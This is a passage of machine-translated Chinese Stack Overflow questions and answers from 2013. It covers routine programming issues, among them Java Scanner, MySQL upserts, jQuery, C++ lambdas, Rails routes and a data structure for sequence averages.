在 .NET 4.0 中，最好的选择是使用第二种方法并在部分中编写整个 SQL 查询`DefiningQuery`（您不能从应用程序中添加更多条件）。或者简单地创建存储过程并通过设计器对其进行映射。

# java - 扫描仪和 nextInt()

> ID：15510451
> 
> 赞同：0
> 
> 时间：2013-03-19T21:07:35.367
> 
> 标签：java, java.util.scanner

伙计们，我在我正在寻找的内容中和周围看到了很多 Q/A，但不完全是我正在寻找的内容。

情况：我正在从文件中读取 suduko 谜题。首先我通过 verify() 方法运行它们，在该方法中调用 next 并检查（预期的）81 个数字中的每一个，以确保它们在 1 和 9 之间。然后我将我的运行计数与 81 进行比较。只要计数 == 81，我知道这个难题至少有能力解决..当我尝试使用 nextInt() 重新访问流时 [这次分配每个进入 suduko 数组] 程序崩溃报告 NoSuchElement。

```
Exception in thread "main" java.util.NoSuchElementException
at java.util.Scanner.throwFor(Scanner.java:838)
at java.util.Scanner.next(Scanner.java:1461)
at java.util.Scanner.nextInt(Scanner.java:2091)
at java.util.Scanner.nextInt(Scanner.java:2050)
at edu.dccc.dpr212.suduko.SudokuPuzzle.<init>(SudokuPuzzle.java:31)
at edu.dccc.dpr212.suduko.Sudoku.main(Sudoku.java:30) 
```

有人说尝试访问关闭的流会导致此错误，但我从不关闭流。我在main中打开文件，并将其作为参数传递给构造函数，然后构造函数将其传递给verify(Scanner input)方法，该方法在扫描仪上调用nextInt()，然后构造函数再次访问它[使用nextInt() ] 将数字分配给拼图。

我认为正在发生的事情是 verify 方法用完 nextInt 方法并且它永远不会重置..这可能吗？我怎么能解决这个问题？我是否过多地传递扫描仪？

代码如下：

```
public SudokuPuzzle(Scanner input)
{

    //verify puzzle FORMAT is correct 
    if (verifyPuzzle(input)) {
        //Load Numbers Into Puzzle Array
        for (int row = 0; row < 9; row++){
            for (int column = 0; column < 9; column++) {
                grid[row][column] = input.nextInt();        
            }
        }       
    }
}

/**Verify Puzzle Is Valid Before Attempting To Solve
 * 
 * @param input (file)
 * @return true if puzzle is valid
 */
public boolean verifyPuzzle(Scanner input) {
    boolean isVerified = false;
    int temp = 0, count = 0;

    while (!input.hasNextInt() == false) {
        temp = input.nextInt();

        // Are Numbers Within Range (1 - 9)?
        if (temp > 9 || temp < 0)
        {
            System.out.println ("Puzzle Is Invalid. " + temp + " is an invalid number in Suduko.");
            count--; //Ensures that last number will not generate valid puzzle count and return puzzle as valid
            break;
        }
        count++;
    }

    //Are There Enough Numbers?
    if (count != 81)
        System.out.println ("Puzzle Is Invalid. Does Not Contain 81 Numbers"); 
    else
        isVerified = true;

    return isVerified;
} 
```

# c# - 如果 MySQL 表中的字段为空，则更新该字段

> ID：15510456
> 
> 赞同：3
> 
> 时间：2013-03-19T21:07:54.197
> 
> 标签：c#, mysql, sql

我在 C# 中有以下 SQL 查询

```
REPLACE INTO users(uid, username, firstseen, ...)
VALUES(@uid, @username, @firstseen, ...) 
```

我希望更新用户记录，但除了第一次看到该用户外，我不想更改 firstseen。我可以查询数据库，但这会增加很多开销，有更好的方法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T21:11:01.057

`REPLACE INTO`将踩踏任何已经存在的数据，相当于 a`DELETE`后跟一个`INSERT`语句。

你可能想要的是：

```
INSERT IGNORE INTO users (uid, username, screenname, ...)
  VALUES (@...)
  ON DUPLICATE KEY UPDATE uid=VALUES(uid), username=VALUES(username), ... 
```

您可以根据需要在该部分中分配特定字段`ON DUPLICATE KEY`，省略那些明显相同的字段。

# asp.net-mvc-4 - 实体框架 5 包括可能包含或不包含匹配项的表

> ID：15510463
> 
> 赞同：1
> 
> 时间：2013-03-19T21:08:24.053
> 
> 标签：asp.net-mvc-4, entity-framework-5

我已经完成了所有工作并显示供应商，但我现在要添加的是一个列，显示哪些供应商已被选中（显示为复选框列）。这些选择存储在另一个表中，其中包含选择它们的 ProfileID 和 UserName（域用户）。因此，当当前域用户看到该表时，将匹配某些供应商而不是其他供应商。

我尝试的是以下内容，但它给了我一个用户名错误。

System.Collections.Generic.ICollection' 不包含“用户名”的定义

但它确实包含此字段，我已在此表的其他查询中使用它（参见模型图片）。

```
IQueryable<VendorProfile> query = _db.VendorProfiles
     .Include("VendorsSelected")
     .Where(x => x.VendorsSelected.UserName.Contains(HttpContext.Current.User.Identity.Name))
     .OrderBy(v => v.ProfileID); 
```

我使用的任何解决方案都必须考虑到存在匹配和不匹配（空值）的事实

![在此处输入图像描述](../Images/7c5737a4cdea821640454a0972e52959.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T22:22:27.303

您应该`UserName` *从*集合中选择`x.VendorsSelected`：

```
IQueryable<VendorProfile> query = _db.VendorProfiles
     .Include("VendorsSelected")
     .Where(x => x.VendorsSelected
                  .Select(v => v.UserName)
                  .Contains(HttpContext.Current.User.Identity.Name))
     .OrderBy(v => v.ProfileID); 
```

# linux - 如何查找特定文件

> ID：15510465
> 
> 赞同：0
> 
> 时间：2013-03-19T21:08:27.163
> 
> 标签：linux, bash, terminal

我想要做的是在另一个计算机用户的 .profile 文件夹中找到标题中包含 BASH 的任何内容，我拥有的代码是

```
find /home/mintuser/.profile -name BASH\* 
```

那行得通吗？当我在终端中按回车键时，它只会输入一个新行，所以不确定它是否执行并且没有给出结果或执行不正确。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T02:34:41.453

如果要在文件夹中递归搜索字符串，可以使用以下命令：

```
find /home/mintuser/.profile -mindepth 1 -maxdepth N -name "*BASH*" 
```

这里“N”是您要搜索的子目录深度的数量。N=2,3,4...

您可以使用 grep 在文件中搜索字符串。例如，如果您想为文件夹 .profile 中的所有文件搜索字符串名称“BASH”，那么您可以使用：

```
 grep -iR BASH /home/mintuser/.profile 
```

选项“i”是不区分大小写的搜索，“R”是递归搜索

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T22:00:16.573

我认为你必须使用

```
grep BASH /home/mintuser/.profile 
```

得到你想要的结果

示例输出：

```
dennis@dennis-pc:~$ grep BASH /home/dennis/.profile

if [ -n "$BASH_VERSION" ]; then 
```

它使用“BASH”打印所有行（对于不区分大小写的搜索使用选项 -i）

# c++ - 如何在 lambda 的 lambda 函数中捕获“this”？

> ID：15510466
> 
> 赞同：9
> 
> 时间：2013-03-19T21:08:32.733
> 
> 标签：c++, c++11, lambda

例如

```
class A
{
    void f() {}
    void g()
    {
        [this]() // Lambda capture this
        {
            f();
            A* p = this;
            [p]() // Workaround to let inner lambda capture this
            {
                p->f();
            };
        };
    }
}; 
```

有什么更好的方法可以在内部 lambda 中捕获它？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-19T21:12:49.190

只需使用`[=]`，这是隐式捕获的。如果您有其他不想通过副本捕获的变量，那么只需 capture `[this]`。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-19T21:14:07.203

您可以重新捕获`this`：

```
class A
{
    void f() {}
    void g()
    {
        [this]()
        {
            f();
            [this]()
        //   ^^^^
            {
                f();
            };
        };
    }
}; 
```

# jsf-2 - 如何通过 js 更改 p:panel 边框颜色？

> ID：15510467
> 
> 赞同：0
> 
> 时间：2013-03-19T21:08:33.537
> 
> 标签：jsf-2, primefaces

如何通过 js 更改边框颜色？

以下示例仅在用户按下按钮时才有效，这意味着颜色将变回默认颜色。

```
 <h:panelGroup>
            <p:commandButton 
                actionListener="#{bean.run}"
                value="Execute"
                update="panel1,panel2" 
                icon="ui-icon-shuffle"
                onclick="document.getElementById('panel2').style.borderColor='#00FF00'">
            </p:commandButton>
        </h:panelGroup>
    </h:panelGrid> 
</p:panel>
<p:messages id="msg" showDetail="false" autoUpdate="true"/>  
<f:verbatim><br/></f:verbatim>
<p:panel id="panel2" style="border-color: #FFFFFF">
    <p:inputTextarea value="#{bean.output}" readonly="true" rows="2" rendered="#{bean.renderOutput}"/>
</p:panel> 
```

如何永久更改 panel2 边框颜色？

谢谢

# visual-studio-2010 - 发布与调试构建

> ID：15510469
> 
> 赞同：1
> 
> 时间：2013-03-19T21:08:44.520
> 
> 标签：visual-studio-2010, c#-4.0, .net-4.0

我有一个 .net 4.0 类库项目，当我在发行版中编译它时，我注意到二进制文件 (.dll) 的大小并不比调试文件小。为什么是这样？不应该更小吗？它也应该执行得更快一点，不是吗？另外，我如何判断 .dll 是否已构建为调试或发布？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T23:14:01.167

当您构建程序集的发布版本时，C# 编译器生成的 IL 几乎没有什么*区别*。它所做的唯一值得注意的事情是省略了帮助您在花括号上设置断点的 NOP 指令。除此之外还有一些花絮，比如不发出空的类构造函数。所有的小东西，只与更容易调试代码有关。给定默认`/filealign`选项，生成的程序集不会更小的可能性很大。或者只是少了几千字节。

C# 编译器没有内置优化器，这不是它的工作。优化器内置于抖动中。由编译器发出的属性[DebuggableAttribute.IsJITOptimizerEnabled](http://msdn.microsoft.com/en-us/library/system.diagnostics.debuggableattribute.isjitoptimizerdisabled.aspx)属性控制。Debug 版本为*true ，Release 版本为**false*。您可以使用 ildasm.exe 查看它的值

您会发现[此答案](https://stackoverflow.com/questions/4043821/performance-differences-between-debug-and-release-builds/4045073#4045073)中描述的抖动执行的优化类型。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:11:59.580

除非您在代码中使用#if DEBUG 编译器指令，否则调试和发布可执行文件（dll、exe 等）是相同的。不同之处在于调试编译会生成包含调试信息的 .pdb 文件。

这个工具可以帮助你找出 dll 是 debug 还是 release：[http ://assemblyinformation.codeplex.com](http://assemblyinformation.codeplex.com)

# jquery - 删除或清空元素的内容

> ID：15510471
> 
> 赞同：6
> 
> 时间：2013-03-19T21:08:48.920
> 
> 标签：jquery

我有一些这样的 HTML：

```
<div>TEXT
    <span>SPAN</span>
        <a href="">LINK</a>
</div> 
```

我想删除元素的内容，通常我会这样做：

```
$('*').empty(); 
```

或者

```
$('*').contents().empty(); 
```

然而，这将删除/清空第一个跨度及其内容，即 div 和链接。在清空元素时我能做些什么来保留它们？所以最终的结果是：

```
<span>
    <div></div>
    <a href=""></a>
</span> 
```

请注意，我正在寻找可以应用于任何 HTML 的“通用”内容。上面只是一个例子，实际上 HTML 结构会包含更多的数据。

[JsFiddle 的示例](http://jsfiddle.net/2sdRm/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T21:13:01.140

递归循环遍历所有节点，并删除所有`nodeType`属性等于 3 ( `Node.TEXT_NODE`) 的子节点。jQuery 不能只选择文本节点，因此可以使用 vanilla JavaScript 来完成。

例子：

```
function removeText(node) {
    if (!node || !node.childNodes || !node.childNodes.length) return;
    for (var i=node.childNodes.length-1; i>=0; --i) {
        var childNode = node.childNodes[i];
        if (childNode.nodeType === 3) node.removeChild(childNode);
        else if (childNode.nodeType === 1) removeText(childNode);
    }   
} 
```

或者，打包在一个 jQuery 插件中：

```
$.fn.removeText = function() {
    for (var i=this.length-1; i>=0; --i) removeText(this[i]);
    return this;
}; 
```

[http://jsfiddle.net/hcKsX/](http://jsfiddle.net/hcKsX/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-19T21:13:07.623

获取父项的子项并设置它们的 html，如下所示：

```
$('#myspan').children().html(''); 
```

[jsFiddle](http://jsfiddle.net/2sdRm/3/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-19T21:17:50.873

这些解决方案都可以，但没有一个能满足您的条件。

示例 #1：删除叶节点内的所有文本

```
$('body *:not(:has(*))').empty() 
```

结果：

```
<span>SPAN
    <div></div>
    <a href=""></a>
</span> 
```

示例 #2：删除仅一个节点的子节点内的所有文本

```
$('body span').children().html('') 
```

结果：

```
<span>SPAN
    <div></div>
    <a href=""></a>
</span> 
```

（同上）。但是，如果嵌套层数超过 2 层，此解决方案将不起作用。

其他解决方案也有类似的缺点。

这里真正的问题是没有好的方法可以从既是父节点又是文本节点的节点中清除文本。你应该要么一起破解一些东西，要么每次都重新渲染你的视图。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-09-04T09:24:24.197

这应该删除 dom 树中的所有文本节点：

```
$('*').contents().filter(
  function() {
    return this.nodeType == 3;
}).remove(); 
```

# c - X11 中的滚轮事件

> ID：15510472
> 
> 赞同：11
> 
> 时间：2013-03-19T21:08:49.563
> 
> 标签：c, x11

我已经翻遍了，震惊地找不到任何关于这个话题的东西。

我只想能够从一个简单的鼠标滚轮捕获事件。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-03-19T22:09:26.400

是的，这令人难以置信的混乱。这是因为 X11 决定将鼠标滚轮事件分配为鼠标按钮 4 和 5。接收滚轮事件与接收鼠标按钮按下事件相同（ButtonPress 事件根据 /usr/include/X11/Xh）。另请注意，头文件定义了 Button1..Button5。按钮 4 和 5 对应于向上或向下——也许不是那个顺序，你必须凭经验来确定。头文件从未提及滚轮事件。

值得庆幸的是，更高级别的 API（如 GDK）通过名称明确提供滚轮支持。

# ios - 不可用时隐藏 iAd

> ID：15510474
> 
> 赞同：0
> 
> 时间：2013-03-19T21:08:50.743
> 
> 标签：ios, objective-c

我正在制作一个具有 iAd 的应用程序，但是当我没有连接到互联网时，iAd 应该在的空间是一个白色的空白空间，我该如何制作它，以便 iAd 空间不是白色的，并且是与背景颜色相同

我想以编程方式制作 iAd，然后我想在不可用时将其隐藏。如果你能给我一些代码，那就太好了。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T21:28:32.953

很高兴听到您在 14 岁时就已经在开发应用程序了。干得好。这是苹果的iad示例代码的链接。下载它并查看方法。它有 3 或 4 种不同的方式来实现 iad，并且有在没有 iad 下载时响应的方法。希望它有所帮助并保持良好的工作。

[http://developer.apple.com/library/ios/ipad/#samplecode/iAdSuite/Introduction/Intro.html](http://developer.apple.com/library/ios/ipad/#samplecode/iAdSuite/Introduction/Intro.html)

如果没有广告，gere 是隐藏横幅的代码：

```
- (void)bannerView:(ADBannerView *)banner didFailToReceiveAdWithError:(NSError *)error
{
if (self.bannerIsVisible)
{
    [UIView beginAnimations:@"animateAdBannerOff" context:NULL];
// Assumes the banner view is placed at the bottom of the screen.
    banner.frame = CGRectOffset(banner.frame, 0, banner.frame.size.height);
    [UIView commitAnimations];
    self.bannerIsVisible = NO;
}
} 
```

这直接来自我在上段中为您提供链接的示例代码。希望你觉得它对我年轻的程序员朋友有用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:32:39.917

**最简单的解决方案：**如果您制作 iAd 容器的背景，`[UIColor clearColor]`那么当没有显示广告时，该容器将不可见。您可以在 Interface Builder 中或以编程方式执行此操作。

# javascript - 正则表达式验证不允许 home、end、箭头键工作

> ID：15510478
> 
> 赞同：1
> 
> 时间：2013-03-19T21:09:05.173
> 
> 标签：javascript, regex, validation

`onpress`问题：我有一个 html 文本输入，它在、`onkeydown`和`onkeyup`事件中使用以下代码：

```
this.value = this.value.replace(/[^a-zA-Z0-9]/, '') 
```

这适用于字母数字验证，但不允许使用 home 键、end 键或箭头键放置光标；光标只能使用退格键移动。老实说，这在某些情况下是可取的行为，但在其他情况下则不然。

为什么在 Firefox 和 Chrome 中出现这种行为（尚未在 IE 中测试）？我的问题是它与`this.value =`将光标放在末尾的部分有关，因为我从未见过箭头键等的正则表达式。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T21:26:43.757

由于您要在每次击键时替换全部内容（实际上，每次击键 3 次），替换后插入符号被放置在末尾。

我建议另一种方法：仅在验证未通过时替换字段的内容：

```
<input id="uname" type="text"> 
```

```
var f = document.getElementById('uname');
f.addEventListener('keyup', function(e){
    var regex = /[^a-zA-Z0-9]/;
    if(regex.test(this.value)) {
        this.value = this.value.replace(regex, '')  
    }
}); 
```

[上面的 JavaScript 片段应该在`<script>`之前的标记中添加`</body>`（或者被包裹在 document.ready/DOMContentLoaded/window.onload 处理程序中，以确保该字段在运行时已经存在）。]

[演示](http://jsfiddle.net/zjSR5/1/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:27:38.267

两件事：首先，您要触发该事件三次，这似乎没有必要。试试这个：

```
<script type="text/javascript">
    function forceAlphaNumeric(field){
        var invalidChars = /[^a-z0-9]/ig
        if(field.value.match(invalidChars))
            field.value = field.value.replace(invalidChars, '');
     }
</script>
<input id="uname" type="text" onkeypress="forceAlphaNumeric(this);" /> 
```

# javascript - AJAX 加载功能出现问题

> ID：15510481
> 
> 赞同：0
> 
> 时间：2013-03-19T21:09:14.817
> 
> 标签：javascript, jquery, ajax, load

我是 jQuery 新手，开始使用 AJAX 加载功能，由于某种原因，我无法让它工作，我尝试了许多不同的形式（使用 .php 等）并最终采用了我尝试过的第一个. 我正在从一个单独的 .html 文件中加载我的内容，并使用该文件中的单个 div 作为 AJAX 插入到我的主要内容 div 的锚点。

头：

```
<script type="text/javascript" src="jquery.js"></script>  
<script type="text/javascript" src="core.js"></script> 
```

导航：

```
<div id="leftnav">
    <p class="leftnavtext">
        <a class="navlinks" id="about2" href="#">ABOUT</a> <br>
        <a class="navlinks" id="process2" href="#">PROCESS</a> <br>
    </p>
</div> 
```

Javascript：

```
$(document).ready(function(){  
  $("about2").click(function(){
    $("#content").load("content.html #about");
  });
}); 
```

我打算将它加载到的 div 显然是`#content`，目前我只是用一个链接尝试这种方法来尝试让它工作。

感谢您提前提供任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:17:38.753

load 只是 AJAX 的包装器，因此您可以在 click 函数中执行此操作...

```
$.ajax({
    type: "POST",
    url: "content.html"})
    .done(function(data) {
      var $about = $(data).filter("#leftnav").children('#about2').html();       
      console.log($about);
      $('#content').html($about);
    });
}); 
```

您正在从外部文件中过滤到特定 ID。

# gfortran - 在冗余优化标志的情况下，实现哪一个？

> ID：15510485
> 
> 赞同：0
> 
> 时间：2013-03-19T21:09:21.260
> 
> 标签：gfortran

我有以下 gfortran 编译。gfortran 将实际实现哪一个优化标志（`-O`或）？`-O2`我尝试对结果目标文件进行八进制转储，但没有任何运气。谢谢！

```
gfortran -c -O -Wuninitialized -fno-automatic -fno-range-check -ffixed-line-length-none -O2 -I. goes_imgr_sky_cvr_ji.f 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T12:52:02.870

如果我正确理解文档，每个`-O`级别都会打开一组优化标志。由于较高级别包括其下级别的所有选项，因此命令行上的最高级别定义了启用的完整标志集。
您可以将其解释为较低级别的标志只是被打开了两次（并且它不能作为双重否定，因此将它们设置两次不会再次将它们关闭）。

不过，您可以自己检查一下，因为通过[文档](http://gcc.gnu.org/onlinedocs/gcc-4.7.2/gcc/Optimize-Options.html#Optimize-Options)，我遇到了以下调用，它将列出启用和禁用的优化。

```
gfortran -Q --help=optimizers <rest of your command line> 
```

# algorithm - 序列平均值的高效数据结构

> ID：15510486
> 
> 赞同：6
> 
> 时间：2013-03-19T21:09:24.497
> 
> 标签：algorithm, data-structures

我需要设计一个数据结构，它可以有效地支持对存储的（我认为合适的）数字序列进行以下操作：

*   将整数添加到序列`x`的第一个元素`i`
*   `k`在序列末尾追加一个整数
*   删除序列的最后一个元素
*   检索序列中所有元素的平均值

### 例子

从空序列开始`[]`

*   追加 0 ( `[0]`)
*   附加 5 ( `[0, 5]`)
*   附加 6 ( `[0, 5, 6]`)
*   将 3 添加到序列中的前 2 个元素 ( `[3, 8, 6]`)
*   检索平均值 5.66 ( `[3, 8, 6]`)
*   删除最后一个元素 ( `[3, 8]`)
*   检索平均值 5.5 ( `[3, 8]`)

### 之前的工作

我考虑过使用[Fenwick 树](http://en.wikipedia.org/wiki/Fenwick_tree)（[Topcoder 社论](http://community.topcoder.com/tc?module=Static&d1=tutorials&d2=binaryIndexedTrees)），但为此我需要为 Fenwick 树的初始化指定序列的最大大小，这不一定知道。但是，如果我有序列可以支持的最大元素数量，`O(lg N)`那么如果我还保存序列中所有元素的总和，我就可以支持这些操作。

**编辑：**问题是针对[Codeforces 问题](http://codeforces.com/problemset/problem/283/A)，我需要所有操作的亚线性运行时间，因为在最坏的情况下，添加到第一个元素可能与添加到整个序列相同

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-19T21:14:29.280

您是否考虑过使用链表加上当前长度和总和？对于每个操作，您可以通过不断的额外工作来保持当前平均值（您知道列表的长度和总和，并且所有操作都以恒定的方式更改这两个值）。

唯一的非常量操作是将常量添加到任意前缀，这将花费与前缀大小成正比的时间，因为您需要调整每个数字。

要使所有操作保持不变（摊销）不变需要更多的工作。不使用双向链表，而是使用堆栈返回数组。数组中的每个槽`i`现在都包含 at 的数字`i`和要添加到每个元素的常量，直到`i`. （请注意，如果您说“将 3 添加到元素 11 之前的每个元素”，则插槽 11 将包含数字 3，但插槽 0-10 将为空。）现在每个操作都与以前一样，除了附加一个新元素涉及标准的数组加倍技巧，当您从队列末尾弹出最后一个元素时，您需要（a）在该插槽中添加常量，以及（b）将插槽中的常量值添加到插槽`i`的常量`i-1`. 所以对于你的例子：

附加0： `[(0,0)], sum 0, length 1`

附录 5： `([(0,0),(5,0)], sum 5, length 2`

附录 6： `[(0,0),(5,0),(6,0)], sum 11, length 3`

将 3 添加到序列中的前 2 个元素：`[(0,0),(5,3),(6,0)], sum 17, length 3`

检索平均值 5.66

删除最后一个元素`[(0,0),(5,3)], sum 11, length 2`

检索平均值 5.5

删除最后一个元素`[(0,3)], sum 3, length 1`

这里有一些 Java 代码可能更清楚地说明了这个想法：

```
class Averager {
  private int sum;
  private ArrayList<Integer> elements = new ArrayList<Integer>();
  private ArrayList<Integer> addedConstants = new ArrayList<Integer>();

  public void addElement(int i) {
    elements.add(i);
    addedConstants.add(0);
    sum += i;
  }

  public void addToPrefix(int k, int upto) {
    addedConstants.set(upto, addedConstants.get(upto) + k);
    sum += k * (upto + 1);
    // Note: assumes prefix exists; in real code handle an error
  }

  public int pop() {
    int lastIndex = addedConstants.length() - 1;

    int constantToAdd = addedConstants.get(lastIndex);
    int valueToReturn = elements.get(lastIndex);
    addedConstants.set(
      lastIndex-1,
      addedConstants.get(lastIndex-1) + constantToAdd);
    sum -= valueToReturn;
    elements.remove(lastIndex);
    addedConstants.remove(lastIndex);
    return valueToReturn + constantToAdd;
    // Again you need to handle errors here as well, particularly where the stack
    // is already empty or has exactly one element
  }

  public double average() {
    return ((double) sum) / elements.length();
  }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-19T21:17:40.063

听起来像一个[双向链表](http://en.wikipedia.org/wiki/Doubly_linked_list)，维护了一个头尾引用，以及当前的总和和计数。

> 将整数 x 添加到序列的前 i 个元素

从 *head 开始，添加`x`，下一项。重复`i`次数。`sum += i*x`

> 将整数 k 附加到序列的末尾

从 *tail 开始，使用 head = tail，tail = null 创建新项目。相应地更新 *tail、sum 和 count。

> 删除序列的最后一个元素

将 *tail 更新为 *tail->prev。更新总和，递减计数

> 检索平均值 5.5 ([3, 8])

返回总和/计数

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-19T22:18:06.957

为了满足第一个要求，您可以维护一个单独的添加操作数据结构。基本上，它是范围和增量的有序集合。您还可以维护这些添加的总和。因此，如果您在前三项中添加 5，然后在前 10 项中添加 12，您将拥有：

```
{3, 5}
{10, 12} 
```

这些加法的总和是`(3*5) + (10*12)`= 135。

当被问及总和时，您提供项目的总和加上这些加法的总和。

您唯一遇到的麻烦是当您删除列表中的最后一项时。然后，您必须浏览此添加内容集合以找到包含最后一项（您要删除的项）的任何内容。该数据结构可以是哈希映射，键是索引。因此，在上面的示例中，您的哈希映射将是：

```
key: 3  value: 5
key: 10 value: 12 
```

每当您执行第一个操作时，您都会检查哈希映射以查看是否已经存在具有该键的项目。如果是这样，您只需更新那里的值而不是添加新的增量。并相应地更新总和。

有趣的。您甚至不必保留额外的总和。您可以在使用时更新总金额。

当您从列表中删除最后一项时，您会检查哈希映射以查找具有该键的项。如果有，则删除该项目，减少键，然后将其添加回哈希映射（或使用该键更新现有项目，如果有的话）。

所以，使用 mattedgod 提出的双向链表，总和就是他提出的。然后使用此哈希映射来维护列表中添加的集合，并相应地更新总和。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-19T21:45:10.047

我建议您尝试使用[Binary Indexed Tree](http://community.topcoder.com/tc?module=Static&d1=tutorials&d2=binaryIndexedTrees)。

它们允许您访问 O(Log(n)) 中的累积频率。

您还可以按 log(i) 顺序添加到前 i 个元素。

但是，不要将前 i 个元素增加 X，而只需将第 n 个元素增加 X。

要删除最后一个元素，也许有另一棵树，它加起来累计删除了多少。（因此，不是删除，而是将该数量添加到另一棵树中，在访问第一棵树时总是从结果中减去）。

对于追加，我建议你从一棵大小为 2*N 的树开始，它会给你空间。然后如果你得到大于 2*N 的大小，添加另一个大小为 2*N 的树。（不完全确定最好的方法，但希望你能弄清楚）。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-03-19T21:16:52.833

这个数据结构可以只是一个元组 (N, S)，其中 N 是计数，S 是总和和一堆数字。没有什么花哨。除了第一个是 O(i) 之外，所有操作都是 O(1)。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-19T21:45:03.253

第 174 轮问题制定者发表了本轮的社论。你可以在[这里](http://www.codeforces.com/blog/entry/7036)找到它。您还可以查看一些公认的解决方案：[Python](http://www.codeforces.com/contest/283/submission/3346098)、[C++](http://www.codeforces.com/contest/283/submission/3357635)。

# ruby-on-rails - Rails 路径变量

> ID：15510492
> 
> 赞同：1
> 
> 时间：2013-03-19T21:09:47.920
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.2, routes, link-to

如果我的 Rails routes.rb 文件中有以下路由：

```
get "time_track/check_in" 
```

我可以在视图中使用的路径变量是什么？我假设类似`time_track_check_in_path`or `check_in_time_track_path`。但是，这些都不起作用：

```
<%= link_to 'Check-in', check_in_time_track_path %>
<%= link_to 'Check-in', time_track_check_in_path %> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:26:45.403

提供动词路由时，`RouteSet`将对控制器/动作和辅助方法名称做出最佳猜测。它确实需要匹配路径中的至少 2 个段，否则您必须自己提供控制器、操作和助手名称。

对于单段匹配器（路径中没有斜杠），需要完整的定义。

```
# Looks for FooController#index and provides foo_path/foo_url
get 'foo', :to => 'foo#index', :as => :foo 
```

对于具有两个或更多段的匹配器，它将采用以下语法。

```
# Looks for FooController#bar and provides foo_bar_path/foo_bar_url
get 'foo/bar'
# Looks for Baz::FooController#bar and provides baz_foo_bar_path/baz_foo_bar_url
get 'baz/foo/bar' 
```

需要注意的一点是，在路径助手名称方面，此行为与资源匹配器不同。使用此语法提供了 namespace_controller_action，而使用资源和命名空间提供了 action_namespace_controller，这可能是您对这两种格式的一些混淆所在。

例如，如果您已经有时间跟踪资源，那么您可以像这样添加它：

```
# Provides /time_track/check_in as check_in_time_track_path mapping to TimeTrackController#check_in
resources :time_track do
  collection do
    get :check_in
  end
end 
```

# sql-server - 将数据从受日期限制的 SQL Server 导入 Excel 工作表

> ID：15510493
> 
> 赞同：0
> 
> 时间：2013-03-19T21:09:49.453
> 
> 标签：sql-server, database, excel, excel-2010

我一直在处理另一个人的工作表，我遇到了一些麻烦。工作表正在从 SQL 服务器上的表中导入所有数据，现在它有大约 200MB。

问题：我只想从相应的月份**和**年份中检索数据。

配置：

```
Excel 2010:
- Connection Properties -> Definition -> Command Type: Table
-           "                  "         Command Text: "Database"."dbo"."Table" 
```

如何在此命令文本中添加“where”子句来限制日期，如月份“03”和年份“2013”​​？或者，我应该怎么做才能让它工作？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:24:17.033

使用命令类型`Table`加载表中的所有行；您需要将命令类型更改为`SQL`，然后您可以使用任何您喜欢的 SQL 查询，例如：

```
select * from MyDatabase.dbo.MyTable 
where YearNumber = 2013 and MonthNumber = 3 
```

# jquery - 发生某些情况时停止 nivo 滑块效果

> ID：15510495
> 
> 赞同：0
> 
> 时间：2013-03-19T21:09:59.437
> 
> 标签：jquery, nivo-slider

当最后一个图像聚焦时，我不想滑动 nivo 滑块。示例

```
$('#slider').nivoSlider({
    manualAdvance: true,
    beforeChange: function(){
        if(condition){
           //do not go to afterChange function
        }
    },
    afterChange: function(){

    }, 
}); 
```

我可以阻止滑块滑动吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T22:05:16.490

NivoSlides 有两个函数来启动/停止滑块，[如其文档中所述。](http://dev7studios.com/nivo-slider/#/documentation)

$('#slider').data('nivoslider').stop(); //停止滑块 $('#slider').data('nivoslider').start(); //启动滑块

所以你可以试试这个：

```
$('#slider').nivoSlider({
        manualAdvance: true,
        beforeChange: function(){
            if(condition){
               $('#slider').data('nivoslider').stop();
            }
        },
        afterChange: function(){

        }, 
    }); 
```

# javascript - 如何在给定项目索引的情况下获取网格行/列位置

> ID：15510497
> 
> 赞同：5
> 
> 时间：2013-03-19T21:10:02.773
> 
> 标签：javascript, math, grid

如果我有一个宽度为 1000 像素的容器，其中填充了所有宽度为 200 像素的项目。如何计算瓷砖的行/列位置？

更详细地解释：

![在此处输入图像描述](../Images/5ad9b2bb6246b8a54ba125eff6fa84de.png)

我知道的唯一变量是容器的宽度（上例中为 1200 像素）、项目的宽度（上例中为 200 像素）和项目索引（从 1 开始）。

仅给出上述信息，我如何通过使用javascript输入其索引来计算单元格的行和列。

例如，给定每行的最大项目值为**6**（可以很容易地从项目宽度和容器宽度计算出来），我需要能够计算出项目编号**7**位于**第 2 行第 1 列**。

容器和项目的宽度可能并不总是完全可整除，因此该等式必须考虑每行末尾所需的任何额外空格，并自然地将项目包装到下一行，就像它们在 html 浮动布局中一样。

提前致谢

**编辑：**

通过执行以下操作，我设法非常准确地获得了该行：

```
